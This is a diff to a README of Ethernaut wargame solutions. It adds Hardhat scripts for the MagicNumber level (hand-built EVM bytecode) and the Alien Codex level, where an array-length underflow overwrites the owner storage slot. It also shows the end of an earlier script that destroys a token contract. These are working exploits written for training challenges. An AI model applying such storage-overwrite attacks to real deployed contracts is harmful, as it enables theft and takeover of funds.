@@ -1,8 +1,6 @@
 # Ethernaut
 
-## Setup
-
-Install and run locally, since the version on https://ethernaut.openzeppelin.com is in read-only mode
+## Local setup
 
 ```sh
 # Install nvm
@@ -614,6 +612,105 @@ async function main() {
   (await token.destroy(signer.address)).wait();
   console.log("Attack complete");
   console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 18 MagicNumber
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  // Contract creation bytecode contains initialization code followed by runtime code.
+  // Ref: https://ethervm.io/
+
+  // Runtime code (exactly 10 bytes):
+  // | Assembly | Bytecode | Notes                                                       |
+  // | -------- | -------- | ----------------------------------------------------------- |
+  // | push1 42 | 0x602a   | Pushes 42 onto the stack, stack width is 256 bits           |
+  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                     |
+  // | mstore   | 0x52     | Stores a 256-bit value in memory (offset, value from stack) |
+  // | push1 32 | 0x6020   | Pushes 32 onto the stack                                    |
+  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                     |
+  // | return   | 0xf3     | Return value from memory (offset, length from stack)        |
+
+  // Initialization code:
+  // | Assembly | Bytecode | Notes                                                                            |
+  // | -------- | -------- | -------------------------------------------------------------------------------- |
+  // | push1 10 | 0x600a   | Pushes 10 onto the stack                                                         |
+  // | push1 12 | 0x600c   | Pushes 12 onto the stack                                                         |
+  // |          |          | This offset depends on the length of the initialization code (12 byte),          |
+  // |          |          | and won't be known until after the rest of it has been written                   |
+  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                                          |
+  // | codecopy | 0x39     | Copy executing bytecode into memory (dest offset, src offset, length from stack) |
+  // | push1 10 | 0x600a   | Pushes 10 onto the stack                                                         |
+  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                                          |
+  // | return   | 0xf3     | Return value from memory (offset, length from stack)                             |
+
+  const bytecode = "0x600a600c600039600a6000f3602a60005260206000f3";
+  const [ signer ] = await hre.ethers.getSigners();
+  const contract = (await (await signer.sendTransaction({from:signer.address, data:bytecode})).wait()).contractAddress;
+  console.log(`Contract address: ${contract}`);
+
+  const target = (await hre.ethers.getContractFactory("MagicNum")).attach("<target contract address>");
+  (await target.setSolver(contract)).wait();
+  console.log("Attack complete");
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 19 Alien Codex
+
+Change the Ownable.sol import to be `@openzeppelin/contracts/ownership/Ownable.sol` and run `npm install @openzeppelin/contracts@v2.5.0` and change the solidity version to `0.5.17` in `hardhat.config.js`
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  // Storage variable layout: Ownable's (address owner) then AlienCodex's (bool contact, bytes32[] codex)
+  // Ref: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/ownership/Ownable.sol
+  // The 20-byte owner address and 1-byte contact bool are stored in the zeroth slot.
+  // For dynamic arrays (bytes32[] codex) the next slot stores the number of elements in the array
+  // and the array data itself starting at keccak256(<slot number>)
+  // Ref: https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays
+  // Note that slots for array data wraps around after reaching the maximum storage slot of (2**256)-1
+  const targetAddress = "<target contract address>";
+  console.log(`Target slot 0: ${await hre.ethers.provider.getStorage(targetAddress, 0)}`);
+  console.log(`Target slot 1: ${await hre.ethers.provider.getStorage(targetAddress, 1)}`);
+
+  // Note that the value specified here must be the full 256-bit (string) value
+  const firstSlot = hre.ethers.toBigInt(hre.ethers.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"));
+  console.log(`Target codex index 0 slot: ${firstSlot}`);
+  const ownerIndex = (2n ** 256n) - firstSlot;
+  console.log(`Target codex index at slot 0: ${ownerIndex}`);
+
+  const targetContract = (await hre.ethers.getContractFactory("AlienCodex")).attach(targetAddress);
+  console.log(`Target owner: ${await targetContract.owner()}`);
+
+  const value = await (async () => {
+    const [ signer ] = await hre.ethers.getSigners();
+    return "0x000000000000000000000000" + hre.ethers.toBigInt(signer.address).toString(16);
+  })();
+
+  (await targetContract.makeContact()).wait();
+
+  // Underflow the size of the codex to cover all the storage slots
+  (await targetContract.retract()).wait();
+
+  (await targetContract.revise(ownerIndex, value)).wait();
+  console.log("Attack complete");
+
+  console.log(`Target slot 0: ${await hre.ethers.provider.getStorage(targetAddress, 0)}`);
+  console.log(`Target owner: ${await targetContract.owner()}`);
 }
 
 main().catch((error) => {
